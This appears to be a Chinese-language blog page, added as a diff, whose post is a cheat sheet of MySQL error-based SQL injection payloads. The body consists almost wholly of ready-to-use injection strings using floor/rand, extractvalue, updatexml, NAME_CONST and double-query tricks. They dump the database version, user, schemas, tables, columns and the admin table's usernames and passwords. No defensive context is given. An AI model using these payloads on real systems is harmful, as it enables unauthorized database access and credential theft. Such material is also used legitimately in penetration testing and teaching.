@@ -1,0 +1,268 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="chrome=1">
+
+    
+
+    <title>
+      mysql显错注入 | Noaccess 
+    </title>
+
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    
+      <meta name="author" content="Noaccess">
+    
+    
+
+    <meta name="description" content="1、通过floor暴错/数据库版本/1and(select 1 from(select count(*),concat((select (select (select concat(0x7e,version(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.t">
+<meta name="keywords" content="零碎知识">
+<meta property="og:type" content="article">
+<meta property="og:title" content="mysql显错注入 | Noaccess">
+<meta property="og:url" content="http://hxcc.github.io/2016/12/29/mysql显错注入/index.html">
+<meta property="og:site_name" content="Noaccess">
+<meta property="og:description" content="1、通过floor暴错/数据库版本/1and(select 1 from(select count(*),concat((select (select (select concat(0x7e,version(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.t">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2017-12-22T09:39:56.650Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="mysql显错注入 | Noaccess">
+<meta name="twitter:description" content="1、通过floor暴错/数据库版本/1and(select 1 from(select count(*),concat((select (select (select concat(0x7e,version(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.t">
+    
+    
+    
+      <link rel="icon" type="image/x-icon" href="/favicon.png">
+    
+    <link rel="stylesheet" href="/css/uno.css">
+    <link rel="stylesheet" href="/css/highlight.css">
+    <link rel="stylesheet" href="/css/archive.css">
+    <link rel="stylesheet" href="/css/china-social-icon.css">
+
+</head>
+<body>
+
+    <span class="mobile btn-mobile-menu">
+        <i class="icon icon-list btn-mobile-menu__icon"></i>
+        <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
+    </span>
+
+    
+
+<header class="panel-cover panel-cover--collapsed">
+
+
+  <div class="panel-main">
+
+  
+    <div class="panel-main__inner panel-inverted">
+    <div class="panel-main__content">
+
+        
+
+        <h1 class="panel-cover__title panel-title"><a href="/" title="link to homepage">Noaccess</a></h1>
+        <hr class="panel-cover__divider" />
+
+        
+        <p class="panel-cover__description">
+          懒人的小窝
+        </p>
+        <hr class="panel-cover__divider panel-cover__divider--secondary" />
+        
+
+        <div class="navigation-wrapper">
+
+          <nav class="cover-navigation cover-navigation--primary">
+            <ul class="navigation">
+
+              
+                
+                <li class="navigation__item"><a href="/#blog" title="" class="blog-button">首页</a></li>
+              
+                
+                <li class="navigation__item"><a href="/about" title="" class="">关于</a></li>
+              
+                
+                <li class="navigation__item"><a href="/archive" title="" class="">归档</a></li>
+              
+
+            </ul>
+          </nav>
+
+          <!-- ----------------------------
+To add a new social icon simply duplicate one of the list items from below
+and change the class in the <i> tag to match the desired social network
+and then add your link to the <a>. Here is a full list of social network
+classes that you can use:
+
+    icon-social-500px
+    icon-social-behance
+    icon-social-delicious
+    icon-social-designer-news
+    icon-social-deviant-art
+    icon-social-digg
+    icon-social-dribbble
+    icon-social-facebook
+    icon-social-flickr
+    icon-social-forrst
+    icon-social-foursquare
+    icon-social-github
+    icon-social-google-plus
+    icon-social-hi5
+    icon-social-instagram
+    icon-social-lastfm
+    icon-social-linkedin
+    icon-social-medium
+    icon-social-myspace
+    icon-social-path
+    icon-social-pinterest
+    icon-social-rdio
+    icon-social-reddit
+    icon-social-skype
+    icon-social-spotify
+    icon-social-stack-overflow
+    icon-social-steam
+    icon-social-stumbleupon
+    icon-social-treehouse
+    icon-social-tumblr
+    icon-social-twitter
+    icon-social-vimeo
+    icon-social-xbox
+    icon-social-yelp
+    icon-social-youtube
+    icon-social-zerply
+    icon-mail
+
+-------------------------------->
+
+<!-- add social info here -->
+
+
+
+        </div>
+
+      </div>
+
+    </div>
+
+    <div class="panel-cover--overlay"></div>
+  </div>
+</header>
+
+    <div class="content-wrapper">
+        <div class="content-wrapper__inner entry">
+            
+
+<article class="post-container post-container--single">
+
+  <header class="post-header">
+    
+    <h1 class="post-title">mysql显错注入</h1>
+
+    
+
+    <div class="post-meta">
+      <time datetime="2016-12-29" class="post-meta__date date">2016-12-29</time> 
+
+      <span class="post-meta__tags tags">
+
+          
+
+          
+             &#8226; 标签:
+            <font class="tags">
+              <a class="tags-link" href="/tags/零碎知识/">零碎知识</a>
+            </font>
+          
+
+      </span>
+    </div>
+    
+    
+
+  </header>
+
+  <section id="post-content" class="article-content post">
+    <h3 id="1、通过floor暴错"><a href="#1、通过floor暴错" class="headerlink" title="1、通过floor暴错"></a>1、通过floor暴错</h3><p>/<em>数据库版本</em>/<br><figure class="highlight objc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and(select <span class="number">1</span> from(select count(*),concat((select (select (select concat(<span class="number">0x7e</span>,version(),<span class="number">0x7e</span>))) from information_schema.tables limit <span class="number">0</span>,<span class="number">1</span>),floor(rand(<span class="number">0</span>)*<span class="number">2</span>))x from information_schema.tables group by x)a)</span><br></pre></td></tr></table></figure>
+/*简单办法暴库*/
+<figure class="highlight objc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">id</span>=info()</span><br></pre></td></tr></table></figure><br>/<em>连接用户</em>/<br><figure class="highlight objc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and(select <span class="number">1</span> from(select count(*),concat((select (select (select concat(<span class="number">0x7e</span>,user(),<span class="number">0x7e</span>))) from information_schema.tables limit <span class="number">0</span>,<span class="number">1</span>),floor(rand(<span class="number">0</span>)*<span class="number">2</span>))x from information_schema.tables group by x)a)</span><br></pre></td></tr></table></figure>
+/*连接数据库*/
+<a id="more"></a>
+<figure class="highlight objc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and(select <span class="number">1</span> from(select count(*),concat((select (select (select concat(<span class="number">0x7e</span>,database(),<span class="number">0x7e</span>))) from information_schema.tables limit <span class="number">0</span>,<span class="number">1</span>),floor(rand(<span class="number">0</span>)*<span class="number">2</span>))x from information_schema.tables group by x)a)</span><br></pre></td></tr></table></figure><br>/<em>暴库</em>/<br><figure class="highlight objc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and(select <span class="number">1</span> from(select count(*),concat((select (select (SELECT distinct concat(<span class="number">0x7e</span>,schema_name,<span class="number">0x7e</span>) FROM information_schema.schemata LIMIT <span class="number">0</span>,<span class="number">1</span>)) from information_schema.tables limit <span class="number">0</span>,<span class="number">1</span>),floor(rand(<span class="number">0</span>)*<span class="number">2</span>))x from information_schema.tables group by x)a)</span><br></pre></td></tr></table></figure>
+/*暴表*/
+<figure class="highlight objc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and(select <span class="number">1</span> from(select count(*),concat((select (select (SELECT distinct concat(<span class="number">0x7e</span>,table_name,<span class="number">0x7e</span>) FROM information_schema.tables where table_schema=database() LIMIT <span class="number">0</span>,<span class="number">1</span>)) from information_schema.tables limit <span class="number">0</span>,<span class="number">1</span>),floor(rand(<span class="number">0</span>)*<span class="number">2</span>))x from information_schema.tables group by x)a)</span><br></pre></td></tr></table></figure><br>/<em>暴字段</em>/<br><figure class="highlight objc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and(select <span class="number">1</span> from(select count(*),concat((select (select (SELECT distinct concat(<span class="number">0x7e</span>,column_name,<span class="number">0x7e</span>) FROM information_schema.columns where table_name=<span class="number">0x61646D696E</span> LIMIT <span class="number">0</span>,<span class="number">1</span>)) from information_schema.tables limit <span class="number">0</span>,<span class="number">1</span>),floor(rand(<span class="number">0</span>)*<span class="number">2</span>))x from information_schema.tables group by x)a)</span><br></pre></td></tr></table></figure>
+/*暴内容*/
+<figure class="highlight objc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and(select <span class="number">1</span> from(select count(*),concat((select (select (SELECT distinct concat(<span class="number">0x23</span>,username,<span class="number">0x3a</span>,password,<span class="number">0x23</span>) FROM admin limit <span class="number">0</span>,<span class="number">1</span>)) from information_schema.tables limit <span class="number">0</span>,<span class="number">1</span>),floor(rand(<span class="number">0</span>)*<span class="number">2</span>))x from information_schema.tables group by x)a)</span><br></pre></td></tr></table></figure></p>
+<h3 id="2、ExtractValue-有长度限制-最长32位"><a href="#2、ExtractValue-有长度限制-最长32位" class="headerlink" title="2、ExtractValue(有长度限制,最长32位)"></a>2、ExtractValue(有长度限制,最长32位)</h3><figure class="highlight objc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and extractvalue(<span class="number">1</span>, concat(<span class="number">0x7e</span>, (select @@version),<span class="number">0x7e</span>))</span><br></pre></td></tr></table></figure>
+<figure class="highlight objc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and extractvalue(<span class="number">1</span>, concat(<span class="number">0x7e</span>,(SELECT distinct concat(<span class="number">0x23</span>,username,<span class="number">0x3a</span>,password,<span class="number">0x23</span>) FROM admin limit <span class="number">0</span>,<span class="number">1</span>)))</span><br></pre></td></tr></table></figure>
+<h3 id="3、UpdateXml-有长度限制-最长32位"><a href="#3、UpdateXml-有长度限制-最长32位" class="headerlink" title="3、UpdateXml(有长度限制,最长32位)"></a>3、UpdateXml(有长度限制,最长32位)</h3><figure class="highlight objc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(SELECT @@version),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+<figure class="highlight objc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(SELECT distinct concat(<span class="number">0x23</span>,username,<span class="number">0x3a</span>,password,<span class="number">0x23</span>) FROM admin limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+<h3 id="4、NAME-CONST-适用于低版本"><a href="#4、NAME-CONST-适用于低版本" class="headerlink" title="4、NAME_CONST(适用于低版本)"></a>4、NAME_CONST(适用于低版本)</h3><figure class="highlight objc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and+<span class="number">1</span>=(select+*+from+(select+NAME_CONST(version(),<span class="number">1</span>),NAME_CONST(version(),<span class="number">1</span>))+as+x)--</span><br></pre></td></tr></table></figure>
+### 5、Error based Double Query Injection (http://www.vaibs.in/error-based-double-query-injection/)
+/*数据库版本*/
+<figure class="highlight objc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">or+<span class="number">1</span>+group+by+concat_ws(<span class="number">0x7e</span>,version(),floor(rand(<span class="number">0</span>)*<span class="number">2</span>))+having+min(<span class="number">0</span>)+or+<span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p><span id="busuanzi_container_page_pv"><br>  本文总阅读量<span id="busuanzi_value_page_pv"></span>次<br></span></p>
+
+  </section>
+
+  <section class="post-comments">
+
+    <!-- 将评论系统（例如Disqus、多说、友言、畅言等）提供的代码片段粘贴在这里 -->
+    
+</section>
+
+
+</article>
+
+
+            <footer class="footer">
+
+    <span class="footer__copyright">&copy; 2014-2015. | 由<a href="https://hexo.io/">Hexo</a>强力驱动 | 主题<a href="https://github.com/someus/huno">Huno</a></span>
+    
+</footer>
+        </div>
+    </div>
+
+    <!-- js files -->
+    <script src="/js/jquery.min.js"></script>
+    <script src="/js/main.js"></script>
+    <script src="/js/scale.fix.js"></script>
+    
+
+    
+
+    <script type="text/javascript" src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    <script type="text/javascript"> 
+        $(document).ready(function(){
+            MathJax.Hub.Config({ 
+                tex2jax: {inlineMath: [['[latex]','[/latex]'], ['\\(','\\)']]} 
+            });
+        });
+    </script>
+
+
+    
+
+    <script src="/js/awesome-toc.min.js"></script>
+    <script>
+        $(document).ready(function(){
+            $.awesome_toc({
+                overlay: true,
+                contentId: "post-content",
+            });
+        });
+    </script>
+
+
+    
+    
+
+    <script src="/js/jquery.githubRepoWidget.min.js"></script>
+
+
+    <!--kill ie6 -->
+<!--[if IE 6]>
+  <script src="//letskillie6.googlecode.com/svn/trunk/2/zh_CN.js"></script>
+<![endif]-->
+
+</body>
+</html>
